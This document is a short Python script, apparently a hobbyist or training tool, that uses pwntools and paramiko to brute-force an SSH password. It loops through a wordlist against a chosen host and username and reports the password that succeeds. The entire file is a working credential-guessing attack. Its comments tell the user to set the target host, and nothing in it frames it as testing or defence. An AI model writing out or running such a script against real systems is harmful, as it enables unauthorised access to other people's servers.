from pwn import *
import paramiko

host="127.0.0.1" # change this to the host you want to brute force
username = "username" # change this to the username you want to brute force
attempts = 0

with open("ssh-common-password.txt", "r") as password_list: # change this to the path of your password list
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("Password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1
